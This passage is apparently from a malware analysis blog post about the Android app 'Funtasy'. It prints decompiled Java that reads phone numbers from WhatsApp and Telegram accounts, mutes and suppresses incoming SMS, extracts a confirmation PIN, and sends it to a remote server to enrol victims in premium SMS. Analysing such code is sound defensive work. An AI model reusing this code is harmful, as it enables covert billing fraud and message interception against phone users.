						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-1"><span class="crayon-m">private</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-e">getPhoneNumberFromAccounts</span><span class="crayon-sy">(</span><span class="crayon-e">Context </span><span class="crayon-v">context</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">throws</span><span class="crayon-h"> </span><span class="crayon-e">Exception</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">v2</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">v8</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Account</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-v">v1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">i</span><span class="crayon-sy">(</span><span class="crayon-s">"Util"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"begin method getPhoneNumberFromAccounts"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">v7</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">try</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">AccountManager</span><span class="crayon-sy">.</span><span class="crayon-e">get</span><span class="crayon-sy">(</span><span class="crayon-v">context</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">getAccounts</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">v5</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"telegram"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">v9</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">v1</span><span class="crayon-sy">.</span><span class="crayon-v">length</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v8</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">catch</span><span class="crayon-sy">(</span><span class="crayon-e">Exception </span><span class="crayon-v">v6</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">goto</span><span class="crayon-h"> </span><span class="crayon-v">label_46</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-16">&nbsp;</div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">while</span><span class="crayon-sy">(</span><span class="crayon-t">true</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-v">v8</span><span class="crayon-h"> </span><span class="crayon-o">&gt;=</span><span class="crayon-h"> </span><span class="crayon-v">v9</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">goto</span><span class="crayon-h"> </span><span class="crayon-v">label_10</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-21">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">try</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">Account </span><span class="crayon-v">v0</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">v1</span><span class="crayon-sy">[</span><span class="crayon-v">v8</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v2</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">v0</span><span class="crayon-sy">.</span><span class="crayon-v">name</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">v3</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">v0</span><span class="crayon-sy">.</span><span class="crayon-v">type</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-v">v3</span><span class="crayon-sy">.</span><span class="crayon-e">equals</span><span class="crayon-sy">(</span><span class="crayon-s">"com.whatsapp"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-v">v3</span><span class="crayon-sy">.</span><span class="crayon-e">equals</span><span class="crayon-sy">(</span><span class="crayon-s">"org.telegram.messenger.account"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-v">v3</span><span class="crayon-sy">.</span><span class="crayon-e">equals</span><span class="crayon-sy">(</span><span class="crayon-s">"org.telegram.account"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-v">v3</span><span class="crayon-sy">.</span><span class="crayon-e">contains</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-v">CharSequence</span><span class="crayon-sy">)</span><span class="crayon-v">v5</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">goto</span><span class="crayon-h"> </span><span class="crayon-v">label_37</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-31">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-v">v2</span><span class="crayon-sy">.</span><span class="crayon-e">equals</span><span class="crayon-sy">(</span><span class="crayon-s">"WhatsApp"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">Util</span><span class="crayon-sy">.</span><span class="crayon-e">isANumber</span><span class="crayon-sy">(</span><span class="crayon-v">v2</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v7</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">Util</span><span class="crayon-sy">.</span><span class="crayon-e">formatPhoneNumber</span><span class="crayon-sy">(</span><span class="crayon-v">v2</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">goto</span><span class="crayon-h"> </span><span class="crayon-v">label_10</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">catch</span><span class="crayon-sy">(</span><span class="crayon-e">Exception </span><span class="crayon-v">v6</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">goto</span><span class="crayon-h"> </span><span class="crayon-v">label_46</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-42">&nbsp;</div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">label_37</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">++</span><span class="crayon-v">v8</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-46">&nbsp;</div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">try</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-48"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v7</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">Util</span><span class="crayon-sy">.</span><span class="crayon-e">formatPhoneNumber</span><span class="crayon-sy">(</span><span class="crayon-v">v2</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-50"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">catch</span><span class="crayon-sy">(</span><span class="crayon-e">Exception </span><span class="crayon-v">v6</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-51"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">label_46</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-52"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">e</span><span class="crayon-sy">(</span><span class="crayon-s">"Util"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"error method getPhoneNumberFromAccounts: "</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">v6</span><span class="crayon-sy">.</span><span class="crayon-e">getMessage</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-53"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v6</span><span class="crayon-sy">.</span><span class="crayon-e">printStackTrace</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-54"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-55">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-56"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">label_10</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-57"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">i</span><span class="crayon-sy">(</span><span class="crayon-s">"Util"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"end method getPhoneNumberFromAccounts"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cf7943201463-58"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">v7</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cf7943201463-59"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0025 seconds] -->
<p>With the phone’s number captured, Funtasy then registers the mobile account with a premium SMS service by sending an HTTP POST request to the following URL.</p>
<ul>
<li>http://funtasymobile.com/alertas_alta_web.php</li>
</ul>
<p>The request is made without the users knowledge, they have no choice to select a number. Of course, premium SMS services require that the user confirm that they want to sign up by sending incoming SMS message containing a PIN.  Funtasy  intercepts this message, parses out the PIN and sends it back to the registration server, completing the enrollment process.</p>
<p><em>IncomingSms.java</em></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694b98e2cfa278432582" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
package com.lasmejoresapps.tvremotecontrol;

import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class IncomingSms extends BroadcastReceiver {
    private static final String TAG = "IncomingSms";
    private String operator;
    private String paso;
    private String phoneNumber;
    private String pin;
    private String url;

    public IncomingSms() {
        super();
    }

    private void changeSms(Context context, Intent intent) throws Exception {
        int v5;
        long v2;
        String v0;
        String v8;
        Log.i("IncomingSms", "begin method changeSms");
        try {
            Bundle v1 = intent.getExtras();
            v8 = "";
            v0 = "";
            v2 = 0;
            if(v1 == null) {
                goto label_38;
            }

            Object v7 = v1.get("pdus");
            SmsMessage[] v6 = new SmsMessage[v7.length];
            v5 = 0;
            while(true) {
            label_14:
                if(v5 &gt;= v6.length) {
                    goto label_16;
                }

                v6[v5] = SmsMessage.createFromPdu(v7[v5]);
                v8 = String.valueOf(v8) + v6[v5].getOriginatingAddress();
                v0 = String.valueOf(v0) + v6[v5].getMessageBody();
                v2 = v6[v5].getTimestampMillis();
                if(v0 != null &amp;&amp; !v0.equals("") &amp;&amp; (v8.equals(Util.decode("Nzk3OTc3")))) {
                    this.pin = this.getPinFromSms(v0);
                }

                break;
            }
        }
        catch(Exception v4) {
            goto label_78;
        }

        ++v5;
        goto label_14;
        try {
        label_16:
            this.stopSms();
            ContentValues v9 = new ContentValues();
            v9.put("address", v8);
            v9.put("body", v0);
            v9.put("read", Integer.valueOf(1));
            v9.put("date", Double.valueOf((((double)v2)) - 1296000000 + 15240000));
            context.getContentResolver().insert(Uri.parse("content://sms/inbox"), v9);
        }
        catch(Exception v4) {
        label_78:
            Log.e("IncomingSms", "error method changeSms: " + v4.getMessage());
            v4.printStackTrace();
        }

    label_38:
        Log.i("IncomingSms", "end method changeSms");
    }

    private String getPinFromSms(String message) throws Exception {
        String v1;
        Log.i("IncomingSms", "begin method getPinFromSms");
        try {
            v1 = Util.extractNumber(message);
        }
        catch(Exception v0) {
            Log.i("IncomingSms", "error method getPinFromSms: " + v0.getMessage());
            v0.printStackTrace();
        }

        Log.i("IncomingSms", "end method getPinFromSms");
        return v1;
    }

    private void muteNotification(Context context) throws Exception {
        Log.i("IncomingSms", "begin method muteNotification");
        try {
            context.getSystemService("audio").setStreamMute(5, true);
        }
        catch(Exception v1) {
            Log.e("IncomingSms", "error method muteNotification: " + v1.getMessage());
            v1.printStackTrace();
        }

        Log.i("IncomingSms", "end method muteNotification");
    }

    public void onReceive(Context context, Intent intent) {
        Log.i("IncomingSms", "begin method onReceive");
        try {
            this.muteNotification(context);
            this.changeSms(context, intent);
            Context v1 = context.getApplicationContext();
            this.phoneNumber = ((Request)v1).getPhoneNumber();
            this.paso = "3";
            this.operator = ((Request)v1).getOperator();
            ((Request)v1).setPin(this.pin);
            new SendPostReqAsync().execute(new String[]{Util.decode("aHR0cDovL2Z1bnRhc3ltb2JpbGUuY29tL2FsZXJ0YXNfYWx0YV93ZWIucGhw"), 
                    this.phoneNumber, this.operator, this.paso, this.pin});
        }
        catch(Exception v0) {
            Log.e("IncomingSms", "error method onReceive: " + v0.getMessage());
            v0.printStackTrace();
        }

        Log.i("IncomingSms", "end method onReceive");
    }

    private void stopSms() throws Exception {
        Log.i("IncomingSms", "begin method stopSms");
        try {
            this.abortBroadcast();
        }
        catch(Exception v0) {
            Log.e("IncomingSms", "error method stopSms: " + v0.getMessage());
            v0.printStackTrace();
        }

        Log.i("IncomingSms", "end method stopSms");
    }
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-2">2</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-4">4</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-6">6</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-8">8</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-10">10</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-12">12</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-13">13</div><div 